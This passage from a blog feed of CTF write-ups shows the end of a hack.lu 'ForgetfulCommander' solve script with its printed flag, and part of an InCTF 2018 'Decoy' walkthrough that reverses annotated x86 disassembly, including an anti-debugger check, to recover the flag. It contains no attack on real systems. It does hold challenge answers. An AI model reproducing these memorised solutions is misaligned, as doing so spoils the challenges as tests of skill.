&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;┌─&lt;/span&gt;[x0r19x91&lt;span style=&#34;color:#ffa500&#34;&gt;@x0r19x91&lt;/span&gt;]&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;─&lt;/span&gt;[~/Desktop/ctf/hacklu/ForgetfulCommander/public]
    &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;└──╼&lt;/span&gt; &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;$&lt;/span&gt; cat solve.py
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;getFlag&lt;/span&gt;(text, size, isDebugging=False):
        ans = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        delta = &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt; + &lt;span style=&#34;color:#3677a9&#34;&gt;0x3b&lt;/span&gt;*isDebugging
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(size):
            ans += &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(text[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;*i+delta+&lt;span style=&#34;color:#3677a9&#34;&gt;0x3008&lt;/span&gt;])^&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(text[i+&lt;span style=&#34;color:#3677a9&#34;&gt;0x33f1&lt;/span&gt;]))
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;forgetful&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt; f:
        data = f.read()
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;[*] Flag -&amp;#39;&lt;/span&gt;, getFlag(data, &lt;span style=&#34;color:#3677a9&#34;&gt;58&lt;/span&gt;)
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# if we have the trap flag set, we get&lt;/span&gt;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;[*] Fake Flag -&amp;#39;&lt;/span&gt;, getFlag(data, &lt;span style=&#34;color:#3677a9&#34;&gt;58&lt;/span&gt;, True)

    &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;┌─&lt;/span&gt;[x0r19x91&lt;span style=&#34;color:#ffa500&#34;&gt;@x0r19x91&lt;/span&gt;]&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;─&lt;/span&gt;[~/Desktop/ctf/hacklu/ForgetfulCommander/public]
    &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;└──╼&lt;/span&gt; &lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;$&lt;/span&gt; python solve.py
    [*] Flag - flag{Just_type__Please__and_the_missles_will_be_launched.}
    [*] Fake Flag - This_is_not_the_flag._Tough_luck..........................
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Yay !!&lt;/p&gt;</description>
        </item>
        <item>
        <title>InCTF 2018 - Decoy</title>
        <link>http://localhost:1313/post/inctf-2018-decoy/</link>
        <pubDate>Thu, 11 Oct 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/inctf-2018-decoy/</guid>
        <description>&lt;p&gt;It&amp;rsquo;s a beautiful challenge. But there is an interesting thing about this challenge.
The author has tried to make a binary tree out of the basic blocks.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_decoy.png&#34; alt=&#34;Image0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_decoy_0.png&#34; alt=&#34;Image1&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get started &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403411          call    sub_4017DE
    .text:00403416          mov     [esp+70h+var_4], eax
    .text:0040341A          cmp     [esp+70h+var_4], 4
    .text:0040341F          jz      loc_403957
    .text:00403425          mov     dword ptr [esp], offset aInput ; &amp;quot;\nInput: &amp;quot;
    .text:0040342C          call    printf
    .text:00403431          mov     eax, ds:_iob
    .text:00403436          mov     [esp+8], eax    ; File
    .text:0040343A          mov     dword ptr [esp+4], 2Dh ; MaxCount
    .text:00403442          lea     eax, [esp+70h+Buf]
    .text:00403446          mov     [esp], eax      ; Buf
    .text:00403449          call    fgets

    .text:00403957 loc_403957:
    .text:00403957          mov     dword ptr [esp], offset aInput ; &amp;quot;\nInput: &amp;quot;
    .text:0040395E          call    printf
    .text:00403963          mov     eax, ds:_iob
    .text:00403968          mov     [esp+8], eax    ; File
    .text:0040396C          mov     dword ptr [esp+4], 2Dh ; MaxCount
    .text:00403974          lea     eax, [esp+70h+Buf]
    .text:00403978          mov     [esp], eax      ; Buf
    .text:0040397B          call    fgets
    .text:00403980          lea     eax, [esp+70h+Buf]
    .text:00403984          mov     [esp+70h+input], eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Oh ! Both looks similar. Which one to follow ??? sub_4017DE knows the answer.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:004017E4          mov     [ebp+var_1C], 0BEEFh
    .text:004017EB          mov     [ebp+var_20], 0DEADh
    .text:004017F2          mov     [ebp+var_24], 0DECh

    .text:004017F9          lea     eax, [ebp+var_1C]
    .text:004017FC          mov     [ebp+var_10], eax
    .text:004017FF          lea     eax, [ebp+var_20]
    .text:00401802          mov     [ebp+var_14], eax
    .text:00401805          lea     eax, [ebp+var_24]
    .text:00401808          mov     [ebp+var_18], eax
    .text:0040180B          mov     eax, [ebp+var_18]

    .text:0040180E          mov     [esp+8], eax
    .text:00401812          mov     eax, [ebp+var_14]
    .text:00401815          mov     [esp+4], eax
    .text:00401819          mov     eax, [ebp+var_10]
    .text:0040181C          mov     [esp], eax
    .text:0040181F          call    sub_401723
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing much to explain here. Let&amp;rsquo;s move on&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401704          push    ebp
    .text:00401705          mov     ebp, esp
    .text:00401707          sub     esp, 8
    .text:0040170A          mov     eax, ds:IsDebuggerPresent
    .text:0040170F          call    eax ; IsDebuggerPresent
    .text:00401711          test    eax, eax
    .text:00401713          jz      short good_boy
    .text:00401715          mov     eax, 0Dh
    .text:0040171A          jmp     short locret_401721
    .text:0040171C good_boy:
    .text:0040171C          mov     eax, 0Eh
    .text:00401721
    .text:00401721 locret_401721:
    .text:00401721          leave
    .text:00401722          retn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we want sub_401704 to return 0xE&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401729          call    sub_401704
    .text:0040172E          mov     [ebp+debugger], eax
    .text:00401731          mov     [ebp+var_10], 0Bh
    .text:00401738          cmp     [ebp+debugger], 0Ah
    .text:0040173C          jle     short loc_40178E
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There was no necessary for if else here. Well, its contributing to the binary tree :-)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:0040173E          mov     eax, [ebp+arg_0]     ; addr of 1st int
    .text:00401741          mov     edx, [eax]
    .text:00401743          mov     eax, [ebp+arg_4]     ; addr of 2nd int
    .text:00401746          mov     eax, [eax]
    .text:00401748          add     edx, eax
    .text:0040174A          mov     eax, [ebp+arg_8]     ; addr of 3rd int
    .text:0040174D          mov     eax, [eax]
    .text:0040174F          add     edx, eax
    .text:00401751          mov     eax, [ebp+debugger]
    .text:00401754          add     eax, edx
    .text:00401756          mov     [ebp+var_10], eax
    .text:00401759          sub     [ebp+var_10], 24F6h
    .text:00401760          mov     ecx, [ebp+var_10]
    .text:00401763          mov     edx, 21195767h
    .text:00401768          mov     eax, ecx
    .text:0040176A          imul    edx
    .text:0040176C          sar     edx, 7
    .text:0040176F          mov     eax, ecx
    .text:00401771          sar     eax, 1Fh
    .text:00401774          sub     edx, eax
    .text:00401776          mov     eax, edx
    .text:00401778          imul    eax, 990     ; 1 + (2**39 / 0x21195767)
    .text:0040177E          sub     ecx, eax     ; mod 990
    .text:00401780          mov     eax, ecx
    .text:00401782          mov     [ebp+var_10], eax
    .text:00401785          add     [ebp+var_10], 4
    .text:00401789          mov     eax, [ebp+var_10]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code returns&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    (var_1C+var_20+var_24+debugger-0x24f6) % 990 + 4
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401824          mov     [ebp+var_C], eax
    .text:00401827          mov     eax, [ebp+var_1C]
    .text:0040182A          cmp     eax, 2710h
    .text:0040182F          jle     short loc_401867     ; false
    .text:00401831          mov     eax, [ebp+var_20]
    .text:00401834          cmp     eax, 0C350h
    .text:00401839          jle     short loc_401851     ; false
    .text:0040183B          mov     eax, [ebp+var_24]
    .text:0040183E          cmp     eax, 7A120h
    .text:00401843          jle     short loc_40184B     ; true

    .text:0040184B loc_40184B:
    .text:0040184B          sub     [ebp+var_C], 0Ah
    .text:0040184F          jmp     short loc_40189B
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The first two conditions are false as the variables are not modified by sub_401723.
To sum up sub_4017DE, it returns&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    &lt;span style=&#34;color:#24909d&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$((&lt;/span&gt; (&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xbeef+0xdead+0xdec+0xe-0x24f6) % &lt;span style=&#34;color:#3677a9&#34;&gt;990&lt;/span&gt; + &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt; - &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# =&amp;gt; 4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets now go back to main. Recall that&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403416          mov     [esp+70h+var_4], eax
    .text:0040341A          cmp     [esp+70h+var_4], 4
    .text:0040341F          jz      loc_403957          ; true :-)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Scroll up a bit and you can see the some lines in the listing of loc_403957. It first reads a string of length atmost 0x2d into Buf.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403990          lea     eax, [esp+70h+Buf]
    .text:00403994          mov     [esp], eax      ; char *
    .text:00403997          call    length
    .text:0040399C          mov     [esp+70h+var_20], eax
    .text:004039A0          cmp     [esp+70h+var_20], 22
    .text:004039A5          jle     badBoy

    .text:004039AB          mov     eax, [esp+70h+input]
    .text:004039AF          add     eax, 0Bh
    .text:004039B2          mov     [esp], eax
    .text:004039B5          call    sub_4018D9
    .text:004039BA          mov     [esp+70h+var_C], eax
    .text:004039BE          cmp     [esp+70h+var_C], 0Bh
    .text:004039C3          jnz     loc_403C4F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The length of the input must be atleast 23 characters. Let&amp;rsquo;s take a look at sub_4018D9&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401904 loc_401904:
    .text:00401904          mov     edx, [ebp+var_4]
    .text:00401907          mov     eax, [ebp+arg_0]    ; input+11
    .text:0040190A          add     eax, edx
    .text:0040190C          movzx   eax, byte ptr [eax]
    .text:0040190F          xor     eax, 11
    .text:00401912          mov     ecx, eax
    .text:00401914          lea     edx, [ebp+var_1C]
    .text:00401917          mov     eax, [ebp+var_4]
    .text:0040191A          add     eax, edx
    .text:0040191C          mov     [eax], cl   ; var_1C[var_4] = input[11+var_4]^11
    .text:0040191E          add     [ebp+var_4], 1
    .text:00401922
    .text:00401922 loc_401922:
    .text:00401922          cmp     [ebp+var_4], 0Ah
    .text:00401926          jle     short loc_401904

    .text:00401931 loc_401931:
    .text:00401931          lea     edx, [ebp+var_1C]
    .text:00401934          mov     eax, [ebp+var_4]
    .text:00401937          add     eax, edx
    .text:00401939          movzx   eax, byte ptr [eax]
    .text:0040193C          xor     eax, 19
    .text:0040193F          mov     ecx, eax
    .text:00401941          lea     edx, [ebp+var_1C]
    .text:00401944          mov     eax, [ebp+var_4]
    .text:00401947          add     eax, edx
    .text:00401949          mov     [eax], cl           ; var_1C[var_4] ^= 19
    .text:0040194B          add     [ebp+var_4], 1
    .text:0040194F
    .text:0040194F loc_40194F:
    .text:0040194F          cmp     [ebp+var_4], 0Ah
    .text:00401953          jle     short loc_401931

    .text:0040195E loc_40195E:
    .text:0040195E          mov     eax, [ebp+var_8]
    .text:00401961          add     eax, offset aFWlgL ; &amp;quot;#f}wLG{ L} &amp;quot;
    .text:00401966          movzx   eax, byte ptr [eax]
    .text:00401969          xor     eax, 11
    .text:0040196C          mov     ecx, eax
    .text:0040196E          lea     edx, [ebp+var_28]
    .text:00401971          mov     eax, [ebp+var_8]
    .text:00401974          add     eax, edx
    .text:00401976          mov     [eax], cl   ; var_28[var_8] = aFWlgL[var_8]^11
    .text:00401978          add     [ebp+var_8], 1
    .text:0040197C
    .text:0040197C loc_40197C:
    .text:0040197C          cmp     [ebp+var_8], 0Ah
    .text:00401980          jle     short loc_40195E

    .text:0040198F loc_40198F:
    .text:0040198F          lea     edx, [ebp+var_1C]
    .text:00401992          mov     eax, [ebp+var_C]
    .text:00401995          add     eax, edx
    .text:00401997          movzx   edx, byte ptr [eax]
    .text:0040199A          lea     ecx, [ebp+var_28]
    .text:0040199D          mov     eax, [ebp+var_C]
    .text:004019A0          add     eax, ecx
    .text:004019A2          movzx   eax, byte ptr [eax]
    .text:004019A5          cmp     dl, al      ; var_28[var_C] == var_1C[var_C]
    .text:004019A7          jnz     short loc_4019B3
    .text:004019A9          add     [ebp+status], 1
    .text:004019AD          add     [ebp+var_C], 1
    .text:004019B1          jmp     short loc_4019BE
    .text:004019B3
    .text:004019B3 loc_4019B3:
    .text:004019B3          mov     [ebp+status], 0
    .text:004019BA          add     [ebp+var_C], 1
    .text:004019BE
    .text:004019BE loc_4019BE:
    .text:004019BE          cmp     [ebp+var_C], 0Ah
    .text:004019C2          jle     short loc_40198F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At 0x004039BE, we see that the status returned by the above routine must be 11. Now we can find &lt;strong&gt;input[11:]&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; i: &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(i)^&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;), &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;#f}wLG{ L} &amp;#34;&lt;/span&gt;))
    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;0und_Th3_n3&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:004039C9          mov     eax, [esp+70h+input]
    .text:004039CD          mov     [esp], eax
    .text:004039D0          call    sub_401AB9
    .text:004039D5          mov     [esp+70h+var_10], eax
    .text:004039D9          cmp     [esp+70h+var_10], 0Bh
    .text:004039DE          jz      loc_403B06
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now sub_401AB9 must return 11 &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401AE5 loc_401AE5:
    .text:00401AE5          mov     eax, [ebp+var_C]
    .text:00401AE8          add     eax, 6
    .text:00401AEB          mov     ecx, [ebp+var_8]
    .text:00401AEE          mov     edx, [ebp+arg_0]
    .text:00401AF1          add     edx, ecx
    .text:00401AF3          movzx   edx, byte ptr [edx]
    .text:00401AF6          add     edx, 4      ;  var_24[var_C+6] = 4+input[var_8]
    .text:00401AF9          mov     [ebp+eax+var_24], dl
    .text:00401AFD          mov     eax, [ebp+var_8]
    .text:00401B00          lea     edx, [eax+5]
    .text:00401B03          mov     eax, [ebp+arg_0]
    .text:00401B06          add     eax, edx
    .text:00401B08          movzx   eax, byte ptr [eax]
    .text:00401B0B          add     eax, 2
    .text:00401B0E          mov     ecx, eax
    .text:00401B10          lea     edx, [ebp+var_24]
    .text:00401B13          mov     eax, [ebp+var_C]
    .text:00401B16          add     eax, edx
    .text:00401B18          mov     [eax], cl   ; var_24[var_C] = 2+input[var_8+5]
    .text:00401B1A          add     [ebp+var_8], 1
    .text:00401B1E          add     [ebp+var_C], 1
    .text:00401B22
    .text:00401B22 loc_401B22:
    .text:00401B22          cmp     [ebp+var_8], 0
    .text:00401B26          js      short loc_401B2E    ; can never be true
    .text:00401B28          cmp     [ebp+var_8], 4
    .text:00401B2C          jle     short loc_401AE5

    .text:00401B2E          mov     eax, [ebp+arg_0]
    .text:00401B31          add     eax, 10
    .text:00401B34          movzx   eax, byte ptr [eax]
    .text:00401B37          add     eax, 2
    .text:00401B3A          mov     [ebp+var_1F], al
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we have&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    var_24 = {
        input[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;,
        input[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* var_1F */&lt;/span&gt;
        input[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, input[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;]+&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401B48 loc_401B48:
    .text:00401B48          mov     eax, [ebp+var_14]
    .text:00401B4B          add     eax, offset a2wahmrgxj ; &amp;quot;}[2waHmrgxj&amp;quot;
    .text:00401B50          movzx   ebx, byte ptr [eax]
    .text:00401B53          mov     edx, [ebp+var_10]   ; zero
    .text:00401B56          mov     eax, [ebp+var_14]
    .text:00401B59          lea     ecx, [edx+eax]
    .text:00401B5C          mov     edx, 2E8BA2E9h
    .text:00401B61          mov     eax, ecx
    .text:00401B63          imul    edx
    .text:00401B65          sar     edx, 1
    .text:00401B67          mov     eax, ecx
    .text:00401B69          sar     eax, 1Fh
    .text:00401B6C          sub     edx, eax
    .text:00401B6E          mov     eax, edx
    .text:00401B70          shl     eax, 2
    .text:00401B73          add     eax, edx
    .text:00401B75          add     eax, eax
    .text:00401B77          add     eax, edx
    .text:00401B79          sub     ecx, eax    ; 1 + (2**33 / 0x2e8ba2e9)
    .text:00401B7B          mov     edx, ecx    ; mod 11
    .text:00401B7D          lea     eax, [ebp+var_24]
    .text:00401B80          add     eax, edx
    .text:00401B82          movzx   eax, byte ptr [eax]
    .text:00401B85          cmp     bl, al  ; var_24[var_14 % 11] == a2wahmrgxj[var_14]
    .text:00401B87          jnz     short loc_401B8D
    .text:00401B89          add     [ebp+status], 1
    .text:00401B8D
    .text:00401B8D loc_401B8D:
    .text:00401B8D          add     [ebp+var_14], 1
    .text:00401B91
    .text:00401B91 loc_401B91:
    .text:00401B91          cmp     [ebp+var_14], 0Ah
    .text:00401B95          jle     short loc_401B48
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore, first 11 characters are&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &amp;gt;&amp;gt;&amp;gt; s = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;}[2waHmrgxj&amp;#34;&lt;/span&gt;
    &amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; i: &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(i)-&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;), s[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;:]) + &lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lambda&lt;/span&gt; i: &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(i)-&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;), s[:&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;]))
    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;inctf{Y0u_F&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the input string now is &lt;code&gt;&amp;quot;inctf{Y0u_F0und_Th3_n3&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403B06 loc_403B06:
    .text:00403B06          call    sub_4018A0      ; 2*IsDebuggerPresent()
    .text:00403B0B          mov     [esp+70h+var_8], eax
    .text:00403B0F          cmp     [esp+70h+var_8], 0
    .text:00403B14          jnz     loc_403BC8

    .text:00403B1A          lea     eax, [esp+70h+Buf]
    .text:00403B1E          mov     [esp], eax      ; char *
    .text:00403B21          call    length
    .text:00403B26          mov     [esp+70h+var_20], eax
    .text:00403B2A          cmp     [esp+70h+var_20], 44
    .text:00403B2F          jnz     bad_boy
    .text:00403B35          mov     dword ptr [esp], 0Ah ; Ch
    .text:00403B3C          call    putchar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The length of the input must be 44. Now we have to find the last 22 characters of the input string.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00403B41          mov     eax, [esp+70h+input]
    .text:00403B45          add     eax, 33
    .text:00403B48          mov     [esp], eax
    .text:00403B4B          call    sub_401E73
    .text:00403B50          mov     [esp+70h+var_14], eax
    .text:00403B54          cmp     [esp+70h+var_14], 0Bh
    .text:00403B59          jnz     short loc_403B90
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Similar piece of code. It validates the last 11 characters of the input.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00401EBC          mov     edx, [ebp+var_C]
    .text:00401EBF          mov     eax, [ebp+arg_0]
    .text:00401EC2          add     eax, edx
    .text:00401EC4          movzx   eax, byte ptr [eax]     ; copy input[33:]
    .text:00401EC7          lea     ecx, [ebp+var_2A]       ; to a local buffer
    .text:00401ECA          mov     edx, [ebp+var_C]
    .text:00401ECD          add     edx, ecx
    .text:00401ECF          mov     [edx], al
    .text:00401ED1          add     [ebp+var_C], 1
    .text:00401ED5
    .text:00401ED5 loc_401ED5:
    .text:00401ED5          cmp     [ebp+var_C], 0Ah
    .text:00401ED9          jle     short loc_401EBC

    .text:00401EE4 loc_401EE4:
    .text:00401EE4          lea     edx, [ebp+var_2A]
    .text:00401EE7          mov     eax, [ebp+var_C]
    .text:00401EEA          add     eax, edx
    .text:00401EEC          movzx   eax, byte ptr [eax]
    .text:00401EEF          mov     edx, eax
    .text:00401EF1          mov     eax, [ebp+var_10]       ; constant = 1
    .text:00401EF4          add     eax, edx
    .text:00401EF6          mov     ecx, eax
    .text:00401EF8          lea     edx, [ebp+var_2A]
    .text:00401EFB          mov     eax, [ebp+var_C]
    .text:00401EFE          add     eax, edx
    .text:00401F00          mov     [eax], cl               ; var_2A[var_C]++
    .text:00401F02          add     [ebp+var_C], 1
    .text:00401F06 loc_401F06:
    .text:00401F06          cmp     [ebp+var_C], 0Ah
    .text:00401F0A          jle     short loc_401EE4

    .text:00401F0C          mov     dword ptr [esp+8], 0Bh ; MaxCount
    .text:00401F14          lea     eax, [ebp+var_2A]
    .text:00401F17          mov     [esp+4], eax
    .text:00401F1B          lea     eax, [ebp+var_1F]
    .text:00401F1E          mov     [esp], eax
    .text:00401F21          call    strncmp                 ; var_2A == var_1F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great ! Now we get the last 11 characters :-)&lt;/p&gt;
